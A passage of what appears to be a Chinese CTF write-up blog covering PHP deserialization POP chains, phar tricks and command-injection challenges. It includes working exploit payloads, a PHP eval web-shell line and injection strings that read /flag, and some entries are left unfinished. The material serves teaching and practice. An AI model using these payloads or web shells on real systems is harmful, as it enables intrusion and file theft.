<p>1.unserialize时候应该先调用wakeup，为了不替换为index.php，则将$this-&gt;source变为类 $source&#x3D;new Show</p>
<p>2.new 之后可以调用__toString()，可以创建一个,利用construct初始化str来newTest</p>
<p>class Show{<br>    public $source;<br>    public $str;<br>    public function __construct(){<br>   return $this-&gt;str&#x3D;new Test;<br>    }</p>
<p>}</p>
<ol start="3">
<li><p>因为$this-&gt;p &#x3D; array()，使用test 调用invoke</p>
</li>
<li><p>最后利用var 获得包含的文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var=&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">   return $this-&gt;str=new Test;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = new Modifier;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new Show;</span><br><span class="line"></span><br><span class="line">$b=new Show;</span><br><span class="line"></span><br><span class="line">$b-&gt;source=$a;</span><br><span class="line"></span><br><span class="line">var_dump(urlencode(serialize($b)));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
</li>
</ol>
<p><img src="/2022/11/25/ooop/j.jpg" alt="题图"></p>
<p><img src="/2022/11/25/ooop/g.jpg" alt="题图"></p>
]]></content>
  </entry>
  <entry>
    <title>ReadlezPHP</title>
    <url>/2022/11/25/fg/</url>
    <content><![CDATA[<p>1.<img src="/2022/11/25/fg/ghj.jpg" alt="进程图"></p>
<p>观察得到get传参获取源码</p>
<p>2.源代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#error_reporting(0);</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &quot;Y-m-d h:i:s&quot;;</span><br><span class="line">        $this-&gt;b = &quot;date&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $a = $this-&gt;a;</span><br><span class="line">        $b = $this-&gt;b;</span><br><span class="line">        echo $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = new HelloPhp;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;source&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[&quot;data&quot;]);</span><br></pre></td></tr></table></figure>

<p>观察到echo $b($a);</p>
<p>使用</p>
<p> $this-&gt;a &#x3D; “phpinfo()”;<br> $this-&gt;b &#x3D; “assert”;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &quot;phpinfo()&quot;;</span><br><span class="line">        $this-&gt;b = &#x27;assert&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = new HelloPhp;</span><br><span class="line">print_r(serialize($c));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>3.<img src="/2022/11/25/fg/chicken.jpg" alt="进程图"></p>
<p>获得flag</p>
]]></content>
  </entry>
  <entry>
    <title>AreUSerialz</title>
    <url>/2022/11/28/zxy/</url>
    <content><![CDATA[<ol>
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    protected $op;</span><br><span class="line">    protected $filename;</span><br><span class="line">    protected $content;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $op = &quot;1&quot;;</span><br><span class="line">        $filename = &quot;/tmp/tmpfile&quot;;</span><br><span class="line">        $content = &quot;Hello World!&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function process() &#123;</span><br><span class="line">        if($this-&gt;op == &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span><br><span class="line">            $res = $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function write() &#123;</span><br><span class="line">        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br><span class="line">            if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span><br><span class="line">                $this-&gt;output(&quot;Too long!&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents($this-&gt;filename, $this-&gt;content);</span><br><span class="line">            if($res) $this-&gt;output(&quot;Successful!&quot;);</span><br><span class="line">            else $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function read() &#123;</span><br><span class="line">        $res = &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function output($s) &#123;</span><br><span class="line">        echo &quot;[Result]: &lt;br&gt;&quot;;</span><br><span class="line">        echo $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op === &quot;2&quot;)</span><br><span class="line">            $this-&gt;op = &quot;1&quot;;</span><br><span class="line">        $this-&gt;content = &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function is_valid($s) &#123;</span><br><span class="line">    for($i = 0; $i &lt; strlen($s); $i++)</span><br><span class="line">        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))</span><br><span class="line">            return false;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[&#x27;str&#x27;];</span><br><span class="line">    if(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>观察可得，</p>
<p>1.应先绕过is_valid才能将str&#x3D;的内容反序列化</p>
<p>if(!(ord($s[$i]) &gt;&#x3D; 32 &amp;&amp; ord($s[$i]) &lt;&#x3D; 125))</p>
<p>则是每一个字符都得属于32到125</p>
<p>经查，不能使用protect，因为php7.1以上的版本对属性类型不敏感，所以可以将属性改为public，public属性序列化不会出现不可见字符</p>
<p>2.destruct()魔术方法<br>op&#x3D;&#x3D;&#x3D;”2”，是强比较，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op === &quot;2&quot;)</span><br><span class="line">            $this-&gt;op = &quot;1&quot;;</span><br><span class="line">        $this-&gt;content = &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p> 而在process()函数中,op&#x3D;&#x3D;”2”是弱比较</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function process() &#123;</span><br><span class="line">        if($this-&gt;op == &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span><br><span class="line">            $res = $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>直接赋值op&#x3D;2；就可以绕过</p>
<p>3.playload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    public $op = 2;</span><br><span class="line">    public  $filename = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">    public  $content = &quot;2&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new FileHandler();</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&#x2F;?str&#x3D;O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:57:”php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php”;s:7:”content”;s:1:”2”;}</p>
<p> <a href="https://segmentfault.com/a/1190000018991087">Generating</a></p>
<p><img src="/2022/11/28/zxy/l.jpg" alt="题图"></p>
]]></content>
  </entry>
  <entry>
    <title>kkkkk</title>
    <url>/2022/11/26/time/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class A&#123;</span><br><span class="line">    protected $store;</span><br><span class="line">    protected $key;</span><br><span class="line">    protected $expire;</span><br><span class="line">    public function __construct($store, $key = &#x27;flysystem&#x27;, $expire = null)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;key    = $key;</span><br><span class="line">        $this-&gt;store  = $store;</span><br><span class="line">        $this-&gt;expire = $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function cleanContents(array $contents)</span><br><span class="line">    &#123;</span><br><span class="line">        $cachedProperties = array_flip([</span><br><span class="line">            &#x27;path&#x27;, &#x27;dirname&#x27;, &#x27;basename&#x27;, &#x27;extension&#x27;, &#x27;filename&#x27;,</span><br><span class="line">            &#x27;size&#x27;, &#x27;mimetype&#x27;, &#x27;visibility&#x27;, &#x27;timestamp&#x27;, &#x27;type&#x27;,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        foreach ($contents as $path =&gt; $object) &#123;</span><br><span class="line">            if (is_array($object)) &#123;</span><br><span class="line">                $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return $contents;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getForStorage()</span><br><span class="line">    &#123;</span><br><span class="line">        $cleaned = $this-&gt;cleanContents($this-&gt;cache);</span><br><span class="line"></span><br><span class="line">        return json_encode([$cleaned, $this-&gt;complete]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function save()</span><br><span class="line">    &#123;</span><br><span class="line">        $contents = $this-&gt;getForStorage();</span><br><span class="line"></span><br><span class="line">        $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if (! $this-&gt;autosave) &#123;</span><br><span class="line">            $this-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B&#123;</span><br><span class="line">    protected function getExpireTime($expire): int</span><br><span class="line">    &#123;</span><br><span class="line">        return (int) $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getCacheKey(string $name): string</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;options[&#x27;prefix&#x27;] . $name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected function serialize($data): string</span><br><span class="line">    &#123;</span><br><span class="line">        if (is_numeric($data)) &#123;</span><br><span class="line">            return (string) $data;</span><br><span class="line">        &#125;</span><br><span class="line">        $serialize = $this-&gt;options[&#x27;serialize&#x27;];</span><br><span class="line">        return $serialize($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function set($name, $value, $expire = null): bool</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;writeTimes++;</span><br><span class="line">        if (is_null($expire)) &#123;</span><br><span class="line">            $expire = $this-&gt;options[&#x27;expire&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">        $expire   = $this-&gt;getExpireTime($expire);</span><br><span class="line">        $filename = $this-&gt;getCacheKey($name);</span><br><span class="line">        $dir = dirname($filename);</span><br><span class="line">        if (!is_dir($dir)) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                mkdir($dir, 0755, true);</span><br><span class="line">            &#125; catch (\Exception $e) &#123;</span><br><span class="line">                // 创建失败</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $data = $this-&gt;serialize($value);</span><br><span class="line">        if ($this-&gt;options[&#x27;data_compress&#x27;] &amp;&amp; function_exists(&#x27;gzcompress&#x27;)) &#123;</span><br><span class="line">            //数据压缩</span><br><span class="line">            $data = gzcompress($data, 3);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data   = &quot;&lt;?php\n//&quot; . sprintf(&#x27;%012d&#x27;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;</span><br><span class="line">        $result = file_put_contents($filename, $data);</span><br><span class="line"></span><br><span class="line">        if ($result) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;src&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = &quot;uploads/&quot;;</span><br><span class="line"></span><br><span class="line">if (!is_dir($dir))</span><br><span class="line">&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[&quot;data&quot;]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Class A</p>
<ol>
<li></li>
</ol>
<p>array_intersect_key()&#96;函数用于比较两个（或更多个）数组的键名 ，并返回交集。</p>
<p>第一段是数组赋值，第二段数组遍历并将两个数组的交际赋给<code>$contents[$path]</code></p>
<p>可以使用path</p>
<?php @eval($_POST["zz"]); ?>

<p>url解码，base64解码之后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$object=array(&quot;path&quot;=&gt;&quot;JTNDJTNGcGhwJTIwZXZhbCUyOCUyNF9HRVQlNUIlMjd6eiUyNyU1RCUyOSUzQiUzRiUzRQ==&quot;);</span><br></pre></td></tr></table></figure>

<ol start="2">
<li></li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>phpweb</title>
    <url>/2022/11/30/xy/</url>
    <content><![CDATA[<ol>
<li></li>
</ol>
<p>依赖系统的时区设置是不安全的。<br>您需要使用 date.timezone 设置或 date_default_timezone_set（） 函数。<br>如果您使用了其中任何一种方法，但仍然收到此警告，则很可能拼写错了时区标识符。<br>我们目前选择了时区“UTC”，但请设置 date.timezone 以选择您的时区。在 &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php 第 24 行</p>
<p>没有太多有用信息</p>
<p>2.看见有刷新，抓个包</p>
<pre><code>&lt;form  id=form1 name=form1 action=&quot;index.php&quot; method=post&gt;     
&lt;input type=hidden id=func name=func value=&#39;date&#39;&gt;     
&lt;input type=hidden id=p name=p value=&#39;Y-m-d h:i:s a&#39;&gt;
</code></pre>
<p>有输入</p>
<p>先使用file_get_contents (index.php)试一下</p>
<p>可以获得源代码</p>
<p>3.获得index</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);</span><br><span class="line">function gettime($func, $p) &#123;</span><br><span class="line">    $result = call_user_func($func, $p);</span><br><span class="line">    $a= gettype($result);</span><br><span class="line">    if ($a == &quot;string&quot;) &#123;</span><br><span class="line">        return $result;</span><br><span class="line">    &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test &#123;</span><br><span class="line">    var $p = &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">    var $func = &quot;date&quot;;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">            echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$func = $_REQUEST[&quot;func&quot;];</span><br><span class="line">$p = $_REQUEST[&quot;p&quot;];</span><br><span class="line"></span><br><span class="line">if ($func != null) &#123;</span><br><span class="line">    $func = strtolower($func);</span><br><span class="line">    if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">        echo gettime($func, $p);</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        die(&quot;Hacker...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>参考抓包使用反序列化</p>
<p>3.func为函数</p>
<p>p为参数</p>
]]></content>
  </entry>
  <entry>
    <title>easy bypass</title>
    <url>/2022/12/24/hhy/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$comm1 = $_GET[&#x27;comm1&#x27;];</span><br><span class="line">$comm2 = $_GET[&#x27;comm2&#x27;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(preg_match(&quot;/\&#x27;|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $comm1))</span><br><span class="line">    $comm1 = &quot;&quot;;</span><br><span class="line">if(preg_match(&quot;/\&#x27;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is&quot;, $comm2))</span><br><span class="line">    $comm2 = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">$flag = &quot;#flag in /flag&quot;;</span><br><span class="line"></span><br><span class="line">$comm1 = &#x27;&quot;&#x27; . $comm1 . &#x27;&quot;&#x27;;</span><br><span class="line">$comm2 = &#x27;&quot;&#x27; . $comm2 . &#x27;&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">$cmd = &quot;file $comm1 $comm2&quot;;</span><br><span class="line">system($cmd);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>1.因为最开始过滤了cat</p>
<p>所以思考用tac替代,来模糊匹配</p>
<p>2.*<em>tac命令</em></p>
<p>反序输出文件的内容，文件的最后一行显示在第一行</p>
<p>它可以对调试日志文件提供了很大的帮助，扭转日志内容的时间顺序。</p>
<p>3.”file $comm1 $comm2”</p>
<p>考虑用;来绕过file</p>
<p>file只能返回文件格式</p>
<p>构造</p>
<p>&#x2F;?comm1&#x3D;index.php”;tac &#x2F;fla?;”&amp;comm2&#x3D;1</p>
<p><img src="/2022/12/24/hhy/result.jpg" alt="题图"></p>
]]></content>
  </entry>
  <entry>
    <title>easy_serialize_php</title>
    <url>/2022/11/26/io/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$function = @$_GET[&#x27;f&#x27;];</span><br><span class="line"></span><br><span class="line">function filter($img)&#123;</span><br><span class="line">    $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;);</span><br><span class="line">    $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;;</span><br><span class="line">    return preg_replace($filter,&#x27;&#x27;,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($_SESSION)&#123;</span><br><span class="line">    unset($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;</span><br><span class="line">$_SESSION[&#x27;function&#x27;] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line">if(!$function)&#123;</span><br><span class="line">    echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!$_GET[&#x27;img_path&#x27;])&#123;</span><br><span class="line">    $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line">if($function == &#x27;highlight_file&#x27;)&#123;</span><br><span class="line">    highlight_file(&#x27;index.php&#x27;);</span><br><span class="line">&#125;else if($function == &#x27;phpinfo&#x27;)&#123;</span><br><span class="line">    eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!</span><br><span class="line">&#125;else if($function == &#x27;show_image&#x27;)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li></li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>Exec</title>
    <url>/2022/12/02/kk/</url>
    <content><![CDATA[<p>1.分号操作符 (; ) 分号操作符使你可以一口气运行几个命令，命令顺序执行。</p>
<p>2.或操作符 (||) 或操作符 (||)很像编程中的else语句。上面的操作符允许你在第一个命令失败的情况下执行第二个命令，但第一个命令成功则第二个不会执行</p>
<ol>
<li><p>和号操作符 (&amp;) ‘&amp;’的作用是使命令在后台运行。只要在命令后面跟上一个空格和 ‘&amp;’。你可以一口气在后台运行多个命令。</p>
</li>
<li><p>分号操作符 (; ) 分号操作符使你可以一口气运行几个命令，命令顺序执行。</p>
</li>
<li><p>与操作符 (&amp;&amp;) 如果第一个命令执行成功，与操作符 (&amp;&amp;)才会执行第二个命令，也就是说，第一个命令退出状态是0，后面的才会执行。在UNIX里面，0表示无错误，而所有非0返回值都是各种错误。</p>
</li>
<li><p>或操作符 (||) 或操作符 (||)很像编程中的else语句。上面的操作符允许你在第一个命令失败的情况下执行第二个命令，但第一个命令成功则第二个不会执行</p>
</li>
<li><p>非操作符 (!) 非操作符 (!)很像except语句。这个命令会执行除了提供的条件外的所有的语句。这个是纯逻辑操作符，注入很少用</p>
</li>
<li><p>管道操作符 (|) PIPE在将第一个命令的输出作为第二个命令的输入时很有用。</p>
</li>
<li><p>优先操作符 () 指定优先级</p>
</li>
<li><p>连接符 () 连接符 ()如它名字所说，被用于连接shell中那些太长而需要分成多行的命令。可以在输入一个“\”之后就回车，然后继续输入命令行，直到输入完成。</p>
<p>可以使用||，前面错误，再执行后边的命令</p>
<p>cd..&#x2F;..&#x2F;..&#x2F;与ls必须前后执行</p>
<p>所以不能用分号连接</p>
<p>![进程图](kk&#x2F;the first step.jpg)</p>
<p><img src="/2022/12/02/kk/effect.jpg" alt="进程图"></p>
</li>
</ol>
<p>111||cd ..&#x2F;..&#x2F;..&#x2F;&amp;&amp;ls;</p>
<p>111||cd ..&#x2F;..&#x2F;..&#x2F;&amp;&amp;cat &#x2F;flag;</p>
]]></content>
  </entry>
  <entry>
    <title>phar练习</title>
    <url>/2022/12/02/pla/</url>
    <content><![CDATA[<h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>1.打开源代码</p>
<p>观察到flag在f1ag.php</p>
<p>2.使用file.php?file&#x3D;读一下index.php file.php</p>
<p>发现文件</p>
<p> ‘function.php’;<br>‘class.php’; </p>
<p>未发现unserialize（）猜测使用phar:&#x2F;&#x2F;.&#x2F;进行反序列化</p>
<p>发现’class.php’; 中含有$text &#x3D; base64_encode(file_get_contents($value));</p>
<p>猜测使用class.php进行反序列化操作</p>
<p>构造pop链</p>
<ol start="3">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#class.php</span><br><span class="line">&lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;test = $this-&gt;str;</span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg</span><br><span class="line">        echo $this-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source;</span><br><span class="line">        return $content;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __set($key,$value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    public function _show()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;,$this-&gt;source)) &#123;</span><br><span class="line">            die(&#x27;hacker!&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            highlight_file($this-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker~&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;params = array();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    public function get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($this-&gt;params[$key])) &#123;</span><br><span class="line">            $value = $this-&gt;params[$key];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $value = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function file_get($value)</span><br><span class="line">    &#123;</span><br><span 